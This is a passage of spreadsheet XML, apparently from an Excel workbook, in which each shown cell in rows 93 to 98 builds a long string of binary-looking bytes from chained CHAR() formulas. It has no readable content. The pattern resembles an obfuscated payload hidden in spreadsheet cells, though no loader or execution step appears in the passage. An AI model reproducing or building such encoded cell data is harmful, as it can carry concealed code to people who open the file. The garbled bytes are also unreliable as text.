PþÒ:Çî_x0012_ÊöUXTY†Æ%Æ‚F'_x000D_†Ä_x000F_òû_x000B__x0007_Å_x0006__x000E_5ÃÈ	_x0001_R‰ïóH_x0016__x0007_Q‰w_x000D_Zr_x001C_‰{_x0010_‰ú_x001E_G_x0007_R‚_x000D_ü\_x000F_†C_x0015__x0005_õB</v>
      </c>
      <c r="C93" t="str">
        <f>CHAR(118)&amp;CHAR(58)&amp;CHAR(233)&amp;CHAR(128)&amp;CHAR(172)&amp;CHAR(144)&amp;CHAR(176)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>v:é€¬°Ë&gt;±</v>
      </c>
    </row>
    <row r="94" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B94" t="str">
        <f>CHAR(26)&amp;CHAR(7)&amp;CHAR(117)&amp;CHAR(24)&amp;CHAR(130)&amp;CHAR(122)&amp;CHAR(17)&amp;CHAR(148)&amp;CHAR(253)&amp;CHAR(119)&amp;CHAR(14)&amp;CHAR(178)&amp;CHAR(5)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(233)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(207)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(130)&amp;CHAR(3)&amp;CHAR(251)&amp;CHAR(91)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(60)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(88)&amp;CHAR(92)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(23)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(8)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(238)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(119)&amp;CHAR(41)&amp;CHAR(27)&amp;CHAR(180)&amp;CHAR(22)&amp;CHAR(21)&amp;CHAR(70)&amp;CHAR(2)&amp;CHAR(188)&amp;CHAR(227)&amp;CHAR(32)&amp;CHAR(70)&amp;CHAR(1)&amp;CHAR(42)&amp;CHAR(198)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(154)&amp;CHAR(4)&amp;CHAR(139)&amp;CHAR(1)&amp;CHAR(226)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(187)&amp;CHAR(103)&amp;CHAR(23)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(67)&amp;CHAR(2)&amp;CHAR(239)&amp;CHAR(221)&amp;CHAR(21)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(120)&amp;CHAR(21)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(41)&amp;CHAR(204)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(10)&amp;CHAR(237)&amp;CHAR(202)&amp;CHAR(17)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(191)&amp;CHAR(200)&amp;CHAR(30)&amp;CHAR(69)&amp;CHAR(11)&amp;CHAR(46)&amp;CHAR(201)&amp;CHAR(2)&amp;CHAR(219)&amp;CHAR(137)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(1)&amp;CHAR(227)&amp;CHAR(185)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(187)&amp;CHAR(117)&amp;CHAR(21)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(42)&amp;CHAR(206)&amp;CHAR(10)&amp;CHAR(207)&amp;CHAR(142)&amp;CHAR(23)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(25)&amp;CHAR(226)&amp;CHAR(167)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(187)&amp;CHAR(116)&amp;CHAR(23)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(67)&amp;CHAR(18)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(21)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(4)&amp;CHAR(21)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(41)&amp;CHAR(204)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(118)&amp;CHAR(17)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(191)&amp;CHAR(121)&amp;CHAR(30)&amp;CHAR(69)&amp;CHAR(11)&amp;CHAR(46)&amp;CHAR(201)&amp;CHAR(2)&amp;CHAR(219)&amp;CHAR(137)&amp;CHAR(15)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(17)&amp;CHAR(227)&amp;CHAR(101)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(187)&amp;CHAR(192)&amp;CHAR(20)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(42)&amp;CHAR(206)&amp;CHAR(10)&amp;CHAR(207)&amp;CHAR(142)&amp;CHAR(23)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(41)&amp;CHAR(226)&amp;CHAR(83)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(187)&amp;CHAR(187)&amp;CHAR(22)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(40)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(4)</f>
        <v>_x001A__x0007_u_x0018_‚z_x0011_”ýw_x000E_²_x0005_I_x0002_…é_x0008_†Ï_x000E_U‚_x0003_û[_x0006_&lt;5ÇX\SÄ_x0017_
ŠE#_x0006_ˆE%ùUS‰N!_x0005__x0008_1ÆÊ_x0004__x0005_]Rî	_x000B__x0002_	Žw)_x001B_´_x0016__x0015_F_x0002_¼ã F_x0001_*Æ_x0004_Íš_x0004_‹_x0001_âë_x001E__x0002__x0005_»g_x0017_I_x0002_(Æ_x0006_Ì€_x0004_C_x0002_ïÝ_x0015__x000E__x0006_ºx_x0015_A_x0007_)Ì_x0006_Å_x0003_ŽJ
íÊ_x0011_	_x0002_¿È_x001E_E_x000B_.É_x0002_Û‰_x000F_ŒK_x0001_ã¹_x0012__x0001__x0006_»u_x0015_J_x0006_*Î
ÏŽ_x0017_‹J_x0019_â§_x001E__x0002__x0005_»t_x0017_I_x0002_(Æ_x0006_Ì€_x0004_C_x0012_ï‰_x0015__x000E__x0006_º_x0004__x0015_A_x0007_)Ì_x0006_Å_x0003_ŽJ_x001A_ív_x0011_	_x0002_¿y_x001E_E_x000B_.É_x0002_Û‰_x000F_ŒK_x0011_ãe_x0012__x0001__x0006_»À_x0014_J_x0006_*Î
ÏŽ_x0017_‹J)âS_x001E__x0002__x0005_»»_x0016_I_x0002_(Æ_x0006_Ì€_x0004_</v>
      </c>
      <c r="C94" t="str">
        <f>CHAR(158)&amp;CHAR(15)&amp;CHAR(224)&amp;CHAR(165)&amp;CHAR(219)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(66)&amp;CHAR(114)&amp;CHAR(173)</f>
        <v>ž_x000F_à¥ÛÏ&gt;Br­</v>
      </c>
    </row>
    <row r="95" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B95" t="str">
        <f>CHAR(141)&amp;CHAR(67)&amp;CHAR(34)&amp;CHAR(239)&amp;CHAR(69)&amp;CHAR(21)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(180)&amp;CHAR(18)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(41)&amp;CHAR(204)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(3)&amp;CHAR(88)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(133)&amp;CHAR(110)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(95)&amp;CHAR(208)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(234)&amp;CHAR(46)&amp;CHAR(48)&amp;CHAR(199)&amp;CHAR(92)&amp;CHAR(108)&amp;CHAR(33)&amp;CHAR(81)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(241)&amp;CHAR(152)&amp;CHAR(71)&amp;CHAR(250)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(250)&amp;CHAR(132)&amp;CHAR(71)&amp;CHAR(209)&amp;CHAR(82)&amp;CHAR(237)&amp;CHAR(193)&amp;CHAR(16)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(112)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(79)&amp;CHAR(208)&amp;CHAR(136)&amp;CHAR(194)&amp;CHAR(11)&amp;CHAR(140)&amp;CHAR(4)&amp;CHAR(95)&amp;CHAR(80)&amp;CHAR(252)&amp;CHAR(90)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(199)&amp;CHAR(119)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(139)&amp;CHAR(72)&amp;CHAR(251)&amp;CHAR(83)&amp;CHAR(143)&amp;CHAR(72)&amp;CHAR(245)&amp;CHAR(87)&amp;CHAR(132)&amp;CHAR(79)&amp;CHAR(242)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(250)&amp;CHAR(91)&amp;CHAR(21)&amp;CHAR(53)&amp;CHAR(193)&amp;CHAR(77)&amp;CHAR(203)&amp;CHAR(203)&amp;CHAR(13)&amp;CHAR(3)&amp;CHAR(62)&amp;CHAR(203)&amp;CHAR(207)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(141)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(207)&amp;CHAR(116)&amp;CHAR(6)&amp;CHAR(177)&amp;CHAR(4)&amp;CHAR(69)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(68)&amp;CHAR(89)&amp;CHAR(141)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(215)&amp;CHAR(83)&amp;CHAR(130)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(117)&amp;CHAR(42)&amp;CHAR(143)&amp;CHAR(143)&amp;CHAR(145)&amp;CHAR(251)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(61)&amp;CHAR(7)&amp;CHAR(153)&amp;CHAR(116)&amp;CHAR(9)&amp;CHAR(69)&amp;CHAR(129)&amp;CHAR(249)&amp;CHAR(1)&amp;CHAR(120)&amp;CHAR(232)&amp;CHAR(238)&amp;CHAR(19)&amp;CHAR(49)&amp;CHAR(208)&amp;CHAR(142)&amp;CHAR(137)&amp;CHAR(145)&amp;CHAR(165)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(55)&amp;CHAR(1)&amp;CHAR(152)&amp;CHAR(112)&amp;CHAR(22)&amp;CHAR(67)&amp;CHAR(144)&amp;CHAR(248)&amp;CHAR(13)&amp;CHAR(112)&amp;CHAR(237)&amp;CHAR(132)&amp;CHAR(58)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(71)&amp;CHAR(2)&amp;CHAR(49)&amp;CHAR(195)&amp;CHAR(236)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(32)&amp;CHAR(1)&amp;CHAR(177)&amp;CHAR(5)&amp;CHAR(69)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(81)&amp;CHAR(196)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(202)&amp;CHAR(252)&amp;CHAR(249)&amp;CHAR(10)&amp;CHAR(197)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(76)&amp;CHAR(201)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(42)&amp;CHAR(30)&amp;CHAR(128)&amp;CHAR(42)&amp;CHAR(1)&amp;CHAR(50)&amp;CHAR(199)&amp;CHAR(192)&amp;CHAR(27)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(173)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(14)&amp;CHAR(202)&amp;CHAR(137)</f>
        <v>C"ïE_x0015__x000E__x0006_º´_x0012_A_x0007_)Ì_x0006_Å_x0003_X‹J-†B-
…n_x0008__x0005_‚C._Ð1ÉÇ_x0007__x000D_^†é‚ê.0Ç\l!Q€Bñ˜Gú€Oú„GÑRíÁ_x0010__x0002__x0003_‚p_x0008_†OÐˆÂ_x000B_Œ_x0004__PüZ_x000D_„Çw_x0011_Ž_x000B_‹HûSHõW„OòYZú[_x0015_5ÁMËË_x000D__x0003_&gt;ËÏ	_x0001_N'_x000B_Ït_x0006_±_x0004_E_x0011_‚éDYU&amp;	1×S‚v'_x0005_Ru*‘û_x0004__x0002__x000E_=_x0007_™t	Eù_x0001_xèî_x0013_1ÐŽ‰‘¥_x0006__x0006__x0008_7_x0001_˜p_x0016_Cø_x000D_pí„:ýúG_x0002_1Ãì_x0002_… _x0001_±_x0005_E_x0011_‚]WQÄ_x0005__x0002_ŽN!_x0001_ŠÊüù
ÅJ_x0006_LÉ_x0002__x0007_ŒF*_x001E_€*_x0001_2ÇÀ_x001B__x0005_†B!_x0003__x000D_­A)_x000E_Ê‰</v>
      </c>
      <c r="C95" t="str">
        <f>CHAR(105)&amp;CHAR(46)&amp;CHAR(247)&amp;CHAR(234)&amp;CHAR(22)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(36)</f>
        <v>i.÷ê_x0016_±ÖÈi$</v>
      </c>
    </row>
    <row r="96" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B96" t="str">
        <f>CHAR(66)&amp;CHAR(44)&amp;CHAR(24)&amp;CHAR(134)&amp;CHAR(43)&amp;CHAR(5)&amp;CHAR(53)&amp;CHAR(193)&amp;CHAR(209)&amp;CHAR(22)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(41)&amp;CHAR(15)&amp;CHAR(14)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(14)&amp;CHAR(193)&amp;CHAR(82)&amp;CHAR(84)&amp;CHAR(92)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(138)&amp;CHAR(131)&amp;CHAR(41)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(90)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(50)&amp;CHAR(142)&amp;CHAR(218)&amp;CHAR(128)&amp;CHAR(222)&amp;CHAR(124)&amp;CHAR(4)&amp;CHAR(67)&amp;CHAR(224)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(139)&amp;CHAR(129)&amp;CHAR(171)&amp;CHAR(1)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(83)&amp;CHAR(89)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(51)&amp;CHAR(137)&amp;CHAR(235)&amp;CHAR(128)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(129)&amp;CHAR(173)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(136)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(227)&amp;CHAR(135)&amp;CHAR(31)&amp;CHAR(69)&amp;CHAR(6)&amp;CHAR(14)&amp;CHAR(155)&amp;CHAR(155)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(41)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(108)&amp;CHAR(66)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(80)&amp;CHAR(73)&amp;CHAR(132)&amp;CHAR(201)&amp;CHAR(8)&amp;CHAR(129)&amp;CHAR(148)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(93)&amp;CHAR(238)&amp;CHAR(209)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(188)&amp;CHAR(135)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(236)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(66)&amp;CHAR(4)&amp;CHAR(8)&amp;CHAR(199)&amp;CHAR(87)&amp;CHAR(82)&amp;CHAR(234)&amp;CHAR(111)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(197)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(82)&amp;CHAR(88)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(74)&amp;CHAR(139)&amp;CHAR(142)&amp;CHAR(176)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(82)&amp;CHAR(236)&amp;CHAR(84)&amp;CHAR(61)&amp;CHAR(142)&amp;CHAR(235)&amp;CHAR(136)&amp;CHAR(230)&amp;CHAR(121)&amp;CHAR(76)&amp;CHAR(190)&amp;CHAR(162)&amp;CHAR(22)&amp;CHAR(67)&amp;CHAR(7)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(21)&amp;CHAR(65)&amp;CHAR(9)&amp;CHAR(44)&amp;CHAR(254)&amp;CHAR(105)&amp;CHAR(57)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(30)&amp;CHAR(89)&amp;CHAR(104)&amp;CHAR(69)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(250)&amp;CHAR(95)&amp;CHAR(74)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(92)&amp;CHAR(234)&amp;CHAR(122)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(234)&amp;CHAR(44)&amp;CHAR(67)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(194)&amp;CHAR(87)&amp;CHAR(87)&amp;CHAR(235)&amp;CHAR(9)&amp;CHAR(21)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(14)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(249)&amp;CHAR(124)&amp;CHAR(40)&amp;CHAR(25)&amp;CHAR(92)&amp;CHAR(80)&amp;CHAR(249)&amp;CHAR(87)&amp;CHAR(91)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(69)&amp;CHAR(232)&amp;CHAR(15)&amp;CHAR(56)&amp;CHAR(205)&amp;CHAR(90)&amp;CHAR(92)&amp;CHAR(88)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(196)&amp;CHAR(91)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(138)&amp;CHAR(125)</f>
        <v>B,_x0018_†+_x0005_5ÁÑ_x0016_	ŽG)_x000F__x000E_A%_x000E_ÁRT\u%_x0019_Šƒ)_x0001__x0002_	Zù_2ŽÚ€Þ|_x0004_CàÀ_x0004__x000B__x0002_Q\‹«_x0001__x000E__x0006_SYþW3‰ë€à	­_x0002__x0002__x0005_²ˆ_x001D_B_x0006_‰ã‡_x001F_E_x0006__x000E_››	_x0005__x0003_€O)_x001D_QlBTRõPI„É_x0008_”_x0002__x0002_	]îÑ_x0017__x0005__x0002_¼‡_x001D_B_x0003_ˆìà!B_x0004__x0008_ÇWRêo_x001E__x0003_
‚Å_x000B_G!_x001D_Vús&amp;_x001E_RXù_J‹Ž°_x0006__x000B__x0005_VRìT=ŽëˆæyL¾¢_x0016_C_x0007_±ž_x0015_A	,þi9M._x001E_YhEUPú_J†Éq/\êz_x001E__x0006__x0007_†éê,C
_x0002_ÂWWë	_x0015__x0006__x0005_„Æ_x000E_ˆI"_x0019_Rù|(_x0019_\PùW[1ÉEè_x000F_8ÍZ\XYZÄ[UWŠ}</v>
      </c>
      <c r="C96" t="str">
        <f>CHAR(58)&amp;CHAR(71)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(172)&amp;CHAR(158)&amp;CHAR(135)</f>
        <v>:G&gt;±Ö€ª¬ž‡</v>
      </c>
    </row>
    <row r="97" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B97" t="str">
        <f>CHAR(35)&amp;CHAR(21)&amp;CHAR(156)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(89)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(50)&amp;CHAR(142)&amp;CHAR(221)&amp;CHAR(140)&amp;CHAR(217)&amp;CHAR(118)&amp;CHAR(15)&amp;CHAR(69)&amp;CHAR(237)&amp;CHAR(206)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(83)&amp;CHAR(80)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(82)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(81)&amp;CHAR(82)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(55)&amp;CHAR(142)&amp;CHAR(229)&amp;CHAR(131)&amp;CHAR(232)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(168)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(182)&amp;CHAR(216)&amp;CHAR(44)&amp;CHAR(72)&amp;CHAR(12)&amp;CHAR(132)&amp;CHAR(228)&amp;CHAR(11)&amp;CHAR(18)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(156)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(30)&amp;CHAR(82)&amp;CHAR(105)&amp;CHAR(71)&amp;CHAR(93)&amp;CHAR(83)&amp;CHAR(254)&amp;CHAR(87)&amp;CHAR(65)&amp;CHAR(130)&amp;CHAR(197)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(135)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(94)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(176)&amp;CHAR(12)&amp;CHAR(23)&amp;CHAR(73)&amp;CHAR(5)&amp;CHAR(133)&amp;CHAR(226)&amp;CHAR(230)&amp;CHAR(46)&amp;CHAR(75)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(198)&amp;CHAR(82)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(120)&amp;CHAR(29)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(15)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(21)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(253)&amp;CHAR(80)&amp;CHAR(64)&amp;CHAR(129)&amp;CHAR(131)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(67)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(83)&amp;CHAR(55)&amp;CHAR(134)&amp;CHAR(227)&amp;CHAR(136)&amp;CHAR(232)&amp;CHAR(117)&amp;CHAR(79)&amp;CHAR(189)&amp;CHAR(210)&amp;CHAR(45)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(195)&amp;CHAR(35)&amp;CHAR(71)&amp;CHAR(5)&amp;CHAR(58)&amp;CHAR(249)&amp;CHAR(122)&amp;CHAR(50)&amp;CHAR(135)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(85)&amp;CHAR(104)&amp;CHAR(69)&amp;CHAR(82)&amp;CHAR(92)&amp;CHAR(253)&amp;CHAR(85)&amp;CHAR(65)&amp;CHAR(128)&amp;CHAR(196)&amp;CHAR(127)&amp;CHAR(41)&amp;CHAR(83)&amp;CHAR(227)&amp;CHAR(158)&amp;CHAR(19)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(237)&amp;CHAR(231)&amp;CHAR(32)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(193)&amp;CHAR(83)&amp;CHAR(80)&amp;CHAR(229)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(193)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(22)&amp;CHAR(88)&amp;CHAR(243)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(25)&amp;CHAR(81)&amp;CHAR(84)&amp;CHAR(236)&amp;CHAR(84)&amp;CHAR(65)&amp;CHAR(54)&amp;CHAR(195)&amp;CHAR(77)&amp;CHAR(224)&amp;CHAR(15)&amp;CHAR(54)&amp;CHAR(193)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(93)&amp;CHAR(92)&amp;CHAR(83)&amp;CHAR(197)&amp;CHAR(128)&amp;CHAR(237)&amp;CHAR(81)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(81)&amp;CHAR(84)&amp;CHAR(94)&amp;CHAR(96)&amp;CHAR(58)&amp;CHAR(86)&amp;CHAR(49)&amp;CHAR(243)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(33)&amp;CHAR(85)&amp;CHAR(85)&amp;CHAR(89)&amp;CHAR(140)&amp;CHAR(112)&amp;CHAR(47)&amp;CHAR(34)&amp;CHAR(191)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(103)&amp;CHAR(131)</f>
        <v>#_x0015_œ„N
_x0006_YýS2ŽÝŒÙv_x000F_EíÎ_x0002__x0004__x000B_SPŠ„R_x0005__x0003_
QRøT7Žåƒè_x0008_†¨_x0005__x000D__x0006_¶Ø,H_x000C_„ä_x000B__x0012_A_x0013__x000D_œ_x0003__x000D__x000B_€A%_x001E_RiG]SþWA‚Å_x001E_†‡	
_x0006_^ê÷_x0016__x0005__x0005_°_x000C__x0017_I_x0005_…âæ.K_x0006__x0004_ÆR[îx_x001D__x0001__x0001_„Æ_x000F_ˆI"_x0015_Wýv!_x0011_Q\ýP@ƒw_x0006__x0006__x0001_CQöS7†ãˆèuO½Ò-J_x0006_ºÃ#G_x0005_:ùz2‡B-_x001A_UhER\ýUA€Ä)Sãž_x0013__x0007__x0002_íç A_x0001__x0004_ÁSPå _x0012__x0007__x0002_Á_x0001_‹M&amp;_x0016_Xóq/_x0019_QTìTA6ÃMà_x000F_6ÁY_]\SÅ€íQ_x0005__x0005__x0011_QT^`:V1óA!!UUYŒp/"¿_x000B__x0004_gƒ</v>
      </c>
      <c r="C97" t="str">
        <f>CHAR(181)&amp;CHAR(141)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(48)&amp;CHAR(105)&amp;CHAR(241)</f>
        <v>µóà!¥û0iñ</v>
      </c>
    </row>
    <row r="98" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B98" t="str">
